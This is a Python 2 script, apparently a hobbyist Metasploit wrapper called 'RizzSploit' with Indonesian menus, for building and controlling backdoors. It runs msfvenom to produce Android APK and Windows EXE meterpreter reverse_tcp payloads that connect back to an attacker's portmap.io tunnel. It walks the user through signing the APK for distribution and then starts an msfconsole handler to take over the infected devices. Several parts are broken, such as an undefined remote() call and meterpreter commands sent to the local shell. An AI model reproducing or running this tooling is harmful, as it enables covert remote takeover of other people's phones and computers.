# -- coding = utf-8 --
# CIE YNG NGINTIP

"follow ig jalanyanglurus_"
"sub to MRH Official"
"telegram http://t.me/MRH404"

import os, sys
import time
import random

putih="\x1b[1;97m"
merah="\x1b[1;91m"
hijau="\x1b[1;92m"
red= '\033[91m'
orange= '\33[38;5;208m'
green= '\033[92m'
cyan= '\033[36m'
bold= '\033[1m'
end= '\033[0m'

os.system('clear')

def flush(s):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(random.random() * 0.01)

def out():
        exit()

def back():
        raw_input('\n\x1b[1;91m                                 [ \x1b[1;97mBack \x1b[1;91m]')
        home()

def nxt():
        raw_input('\n\x1b[1;91m                                 [ \x1b[1;97mNext \x1b[1;91m]')
        os.system('clear')

def logo():
        f = open('asci')
        print merah+f.read()
        f.close
        print '---------------------------------------------------'
        print cyan+' Author  : '+green+'RizzSploit {ThreRata92} '
        print cyan+' Github  : '+green+'http://github.com/RizzSploit '
        print cyan+' Youtube : '+green+'RizzSploit '                   
        print putih+'---------------------------------------------------'
        print ''

def update():
        os.system('clear')
        os.system('git stash && git pull origin master')
        os.system('python2 install.py')
        raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
        home()

def help():    
    os.system('clear')
    logo()
    print cyan+'======================================'
    print merah+'List Of Commands :'
    print green+' ~ backdoor/android : Membuat Backdoor Baru untuk android'
    print green+' ~ backdoor/windows : Membuat Backdoor Baru untuk windows'
    print green+' ~ Eksekusi :MengEksekusi Target'
    print green+' ~ Update : MengUpdate SC'
    print green+' ~ Help : Menunjukkan Bantuan'
    print green+' ~ exit : keluar'
    print merah+' FOLLOW IG @_RZZREO_'
    print cyan+'======================================='
    ok = raw_input(merah+'Lanjut (y/n) : ')
    if ok == 'n':
        help()
    else:
        if ok == 'y':
            menu()
def Eksekusi():
    os.system('clear')
    logo()
    os.system('rm -rf ip.txt')
    os.system('ifconfig > ip.txt')
    f = open('ip.txt')
    g = merah+f.read()
    print ''
    print g
    f.close
    print putih+'Jika Tun0 diatas kosong, Aktifkan OpenVPN'
    print "\x1b[1;91m----------------------------------------------"
    print " Masukan IP tun0 inet: "
    lh =raw_input(" LHOST : ")
    if lh== '':
      print merah+"[!] Harus DiIsi"
      time.sleep(1)
      os.system("clear")
      remote()
    print "\x1b[1;97mMasukan LPORT"
    print "contoh"
    print "tcp://Xzla-44479.portmap.io:44479-=>\x1b[1;91m8080"
    print "\x1b[1;91m                                            ^"
    print "----------------------------------------------"
    lp =raw_input("LPORT : ")
    if lp == ' ':
      print "[!]Harus DiIsi"
      time.sleep(1)
      os.system("clear")
      Eksekusi()
    else :
      raw_input(merah+"Anda Akan Memasuki Mode METERPRETER (AUTO PRESISTENT) Enter Untuk Lanjut")
      os.system("clear")
      os.system("msfconsole -x 'use exploit/multi/handler;set payload android/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit; sessions -k 1-5'");
      os.system("upload kuat.sh")
      os.system("execute -f kuat.sh")
      raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
      os.system('clear')
    
def eksekusi2():
    os.system('clear')
    logo()
    os.system('rm -rf ip.txt')
    os.system('ifconfig > ip.txt')
    f = open('ip.txt')
    g = merah+f.read()
    print ''
    print g
    f.close
    print putih+'Jika Tun0 diatas kosong, Aktifkan OpenVPN'
    print "\x1b[1;91m----------------------------------------------"
    print " Masukan IP tun0 inet: "
    lh =raw_input(" LHOST : ")
    if lh== '':
      print merah+"[!] Harus DiIsi"
      time.sleep(1)
      os.system("clear")
      remote()
    print "\x1b[1;97mMasukan LPORT"
    print "contoh"
    print "tcp://Xzla-44479.portmap.io:44479-=>\x1b[1;91m8080"
    print "\x1b[1;91m                                            ^"
    print "----------------------------------------------"
    lp =raw_input("LPORT : ")
    if lp == ' ':
      print "[!]Harus DiIsi"
      time.sleep(1)
      os.system("clear")
      Eksekusi()
    else :
      raw_input(merah+"Anda Akan Memasuki Mode METERPRETER (AUTO PRESISTENT) Enter Untuk Lanjut")
      os.system("clear")
      os.system("msfconsole -x 'use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST "+str(lh)+";set LPORT "+str(lp)+";exploit; sessions -k 1-5'");
      os.system("upload kuat.sh")
      os.system("execute -f kuat.sh")
      raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
      os.system('clear')
    
def baru():
    os.system('clear')
    logo()
    print merah+"Contoh Nama Aplikasi (Backdoor.apk tanpa .apk)"
    name=raw_input("Name : ")
    print "\x1b[1;97mAmbil \x1b[1;91m5 Digit angka \x1b[1;97mSetelah TAnda (:)"
    print "Contoh Menggunakan Config Saya"
    print "tcp://Xzla-44479.portmap.io:\x1b[1;91m44479"
    print "                              \x1b[1;91m^ Masukkan port"
    print "----------------------------------------------"
    port=raw_input("Port : ")
    print "\x1b[1;97mMasukan LHOST"
    print "Contoh Menggunakan Config Saya"
    print "\x1b[1;91mXzla-44479.portmap.io"
    print "\x1b[1;91m                 ^"
    print "----------------------------------------------"
    lh=raw_input("lhost : ")
    os.system('clear')
    print hijau+"[*] Lagi Membuat Backdoor, Mohon Bersabar..."
    os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+lh+" LPORT="+port+" R > /sdcard/"+name+".apk")
    time.sleep(4)
    os.system('mv '+str(name)+'.apk /storage/emulated/0/')
    time.sleep(4)
    print merah+"Buka Apk-Signer,Lalu "+name+".apk Nya"
    os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    home()

def baru2():
    os.system('clear')
    logo()
    print merah+"Contoh Nama Aplikasi (Backdoor.Exe tanpa .Exe)"
    name=raw_input("Name : ")
    print "\x1b[1;97mAmbil \x1b[1;91m5 Digit angka \x1b[1;97mSetelah TAnda (:)"
    print "Contoh Menggunakan Config Saya"
    print "tcp://Xzla-44479.portmap.io:\x1b[1;91m44479"
    print "                              \x1b[1;91m^ Masukkan port"
    print "----------------------------------------------"
    port=raw_input("Port : ")
    print "\x1b[1;97mMasukan LHOST"
    print "Contoh Menggunakan Config Saya"
    print "\x1b[1;91mXzla-44479.portmap.io"
    print "\x1b[1;91m                 ^"
    print "----------------------------------------------"
    lh=raw_input("lhost : ")
    os.system('clear')
    print hijau+"[*] Lagi Membuat Backdoor, Mohon Bersabar..."
    os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+lh+" LPORT="+port+" R > /sdcard/"+name+".exe")
    print green+"Sukses Membuat Backdoor Dengan Nama "+name+".apk !!!"
    raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
    home()

def menu():
        os.system('clear')
        time.sleep(1)
        logo()
        flush (merah+"FOLLOW IG : @jalanyanglurus_")
        flush (green+"Tersedia Versi PRO (500k)")
   
def pilih():
    zedd = raw_input(merah+'MSFVIP$ > ')
    if zedd == '':
        print merah+'[!] Ora Paham Aku'
        time.sleep(1)
        os.system('clear')
        home()
    else:
        if zedd == 'backdoor/android':
            baru()
        else:
            if zedd == 'backdoor/windows':
                baru2()
            else:
              if zedd == 'help':
                help()
                home()
              else:
				  if zedd == 'eksekusi/android':
					Eksekusi()
				  else:	
					 if zedd == 'eksekusi/windows':
					   eksekusi2()
					 else:
					   print 'ok'
					   if zedd == 'exit':
					     exit()
					   else:
					     print '\x1b[1;91m[!] Pilih 1-6'
					     os.system('clear')
					     home()

def home():
	menu()
	pilih()         

home()
